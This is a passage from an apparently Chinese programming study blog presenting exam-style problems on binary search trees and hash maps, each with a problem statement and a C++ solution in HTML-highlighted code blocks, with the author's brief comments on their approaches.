class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MidOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(t-&gt;l);</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(t-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(t-&gt;r);</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line"><span class="built_in">build</span>(root, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="二叉搜索树">二叉搜索树</h1><h5 id="题目描述-21">题目描述</h5><p>判断两序列是否为同一二叉搜索树序列</p><h5 id="输入输出格式-19">输入输出格式</h5><h6 id="输入描述-21">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开始一个数<span class="built_in">n</span>，(<span class="number">1</span>&lt;=<span class="built_in">n</span>&lt;=<span class="number">20</span>) 表示有<span class="built_in">n</span>个需要判断，<span class="built_in">n</span>= <span class="number">0</span> 的时候输入结束。</span><br><span class="line">接下去一行是一个序列，序列长度小于<span class="number">10</span>，包含(<span class="number">0</span>~<span class="number">9</span>)的数字，没有重复数字，根据这个序列可以构造出一颗二叉搜索树。</span><br><span class="line">接下去的<span class="built_in">n</span>行有<span class="built_in">n</span>个序列，每个序列格式跟第一个序列一样，请判断这两个序列是否能组成同一颗二叉搜索树。</span><br></pre></td></tr></table></figure><h6 id="输出描述-21">输出描述:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果序列相同则输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span></span><br></pre></td></tr></table></figure><p>我的方法是对每个序列建一个树，然后存储和其前序遍历字符串进行比较</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">char</span> d;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="type">char</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t, string &amp;s)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">s+= t-&gt;d;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;l, s);</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;r, s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line">string s, s0;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">build</span>(root, s[i]); </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(root, s0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string st;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">Tree rt;</span><br><span class="line">rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="built_in">build</span>(rt, s[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(rt, st);</span><br><span class="line"><span class="keyword">if</span>(st == s0)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下别人的方法，需要前序和中序才能确定一颗唯一的树，我只用了前序应该是有问题的，但测试用例应该里没有专门设计一个这样的用例233.</p><h3 id="二叉排序树---华科">二叉排序树 - 华科</h3><h5 id="题目描述-22">题目描述</h5><p>二叉排序树，也称为二叉查找树。可以是一颗空树，也可以是一颗具有如下特性的非空二叉树：1. 若左子树非空，则左子树上所有节点关键字值均不大于根节点的关键字值； 2.若右子树非空，则右子树上所有节点关键字值均不小于根节点的关键字值； 3.左、右子树本身也是一颗二叉排序树。现在给你N个关键字值各不相同的节点，要求你按顺序插入一个初始为空树的二叉排序树中，每次插入后成功后，求相应的父亲节点的关键字值，如果没有父亲节点，则输出-1。</p><h5 id="输入输出格式-20">输入输出格式</h5><h6 id="输入描述-22">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入包含多组测试数据，每组测试数据两行。</span><br><span class="line">第一行，一个数字<span class="built_in">N</span>（<span class="built_in">N</span>&lt;=<span class="number">100</span>），表示待插入的节点数。</span><br><span class="line">第二行，<span class="built_in">N</span>个互不相同的正整数，表示要顺序插入节点的关键字值，这些值不超过<span class="number">10</span>^<span class="number">8</span>。</span><br></pre></td></tr></table></figure><h6 id="输出描述-22">输出描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出共<span class="built_in">N</span>行，每次插入节点后，该节点对应的父亲节点的关键字值。</span><br></pre></td></tr></table></figure><p>边插入边找，递归的函数加一个参数作为根节点即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(Tree r, Tree &amp;t, <span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> r-&gt;d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) res = r-&gt;d;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &lt; t-&gt;d) res = <span class="built_in">build</span>(t, t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> res = <span class="built_in">build</span>(t, t-&gt;r, a);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">Tree tmp = <span class="keyword">new</span> node;</span><br><span class="line">tmp-&gt;d = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> a[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">build</span>(tmp, root, a[i]);</span><br><span class="line">cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hash">hash</h2><h3 id="统计同成绩学生人数">统计同成绩学生人数</h3><h5 id="题目描述-23">题目描述</h5><p>读入N名学生的成绩，将获得某一给定分数的学生人数输出。</p><h5 id="输入输出格式-21">输入输出格式</h5><h6 id="输入描述-23">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试输入包含若干测试用例，每个测试用例的格式为</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第<span class="number">1</span>行：<span class="built_in">N</span></span><br><span class="line">第<span class="number">2</span>行：<span class="built_in">N</span>名学生的成绩，相邻两数字用一个空格间隔。</span><br><span class="line">第<span class="number">3</span>行：给定分数</span><br><span class="line"></span><br><span class="line">当读到<span class="built_in">N</span>=<span class="number">0</span>时输入结束。其中<span class="built_in">N</span>不超过<span class="number">1000</span>，成绩分数为（包含）<span class="number">0</span>到<span class="number">100</span>之间的一个整数。</span><br></pre></td></tr></table></figure><h6 id="输出描述-23">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每个测试用例，将获得给定分数的学生人数输出。</span><br></pre></td></tr></table></figure><p>直接map</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="type">int</span> a[n], sn;</span><br><span class="line">map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">m[a[i]] ++;</span><br><span class="line">&#125;</span><br><span class="line">cin &gt;&gt; sn;</span><br><span class="line"><span class="keyword">if</span>(m.<span class="built_in">find</span>(sn) != m.<span class="built_in">end</span>())&#123;</span><br><span class="line">cout &lt;&lt; m[sn] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="谁是你的潜在朋友">谁是你的潜在朋友</h3><h5 id="题目描述-24">题目描述</h5><pre><code>“臭味相投”——这是我们描述朋友时喜欢用的词汇。两个人是朋友通常意味着他们存在着许多共同的兴趣。然而作为一个宅男，你发现自己与他人相互了解的机会并不太多。幸运的是，你意外得到了一份北大图书馆的图书借阅记录，于是你挑灯熬夜地编程，想从中发现潜在的朋友。     首先你对借阅记录进行了一番整理，把N个读者依次编号为1,2,…,N，把M本书依次编号为1,2,…,M。同时，按照“臭味相投”的原则，和你喜欢读同一本书的人，就是你的潜在朋友。你现在的任务是从这份借阅记录中计算出每个人有几个潜在朋友。</code></pre><h5 id="输入输出格式-22">输入输出格式</h5><h6 id="输入描述-24">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个案例第一行两个整数<span class="built_in">N</span>,M，<span class="number">2</span> &lt;= <span class="built_in">N</span> ，M&lt;= <span class="number">200</span>。接下来有<span class="built_in">N</span>行，第i(i = <span class="number">1</span>,<span class="number">2</span>,…,<span class="built_in">N</span>)行每一行有一个数，表示读者i-<span class="number">1</span>最喜欢的图书的编号P(<span class="number">1</span>&lt;=P&lt;=M)</span><br></pre></td></tr></table></figure><h6 id="输出描述-24">输出描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个案例包括N行，每行一个数，第<span class="selector-tag">i</span>行的数表示读者<span class="selector-tag">i</span>有几个潜在朋友。如果<span class="selector-tag">i</span>和任何人都没有共同喜欢的书，则输出“BeiJu”（即悲剧，^ ^）</span><br></pre></td></tr></table></figure><p>mapmap</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mm;</span><br><span class="line"><span class="type">int</span> a[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">mm[a[i]]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(mm[a[i]] == <span class="number">1</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;BeiJu&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; mm[a[i]] - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="剩下的树">剩下的树</h3><h5 id="题目描述-25">题目描述</h5><p>有一个长度为整数L(1&lt;=L&lt;=10000)的马路，可以想象成数轴上长度为L的一个线段，起点是坐标原点，在每个整数坐标点有一棵树，即在0,1,2，...，L共L+1个位置上有L+1棵树。现在要移走一些树，移走的树的区间用一对数字表示，如 100200表示移走从100到200之间（包括端点）所有的树。可能有M(1&lt;=M&lt;=100)个区间，区间之间可能有重叠。现在要求移走所有区间的树之后剩下的树的个数。</p><h5 id="输入输出格式-23">输入输出格式</h5><h6 id="输入描述-25">输入描述:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">两个整数L(<span class="number">1</span>&lt;<span class="operator">=</span>L&lt;<span class="operator">=</span><span class="number">10000</span>)和M(<span class="number">1</span>&lt;<span class="operator">=</span>M&lt;<span class="operator">=</span><span class="number">100</span>)。</span><br><span class="line">    接下来有M组整数，每组有一对数字。</span><br></pre></td></tr></table></figure><h6 id="输出描述-25">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能有多组输入数据，对于每组输入数据，输出一个数，表示移走所有区间的树之后剩下的树的个数。</span><br></pre></td></tr></table></figure><p>纯暴力的方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mm;</span><br><span class="line"><span class="type">int</span> a[n+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">a[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>, begin, end;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; begin &gt;&gt; end;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= begin &amp;&amp; j &lt;= end &amp;&amp; a[j] == <span class="number">1</span>)&#123;</span><br><span class="line">a[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == <span class="number">1</span>) cnt ++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下别人的，有个方法叫差分数组，就是用一个数组维护原数组前一个对后一个的差，如果要统一修改[a,b]之间的值只需要在a、b两点修改差分数组就行了，复杂度只有on</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n+<span class="number">2</span>, <span 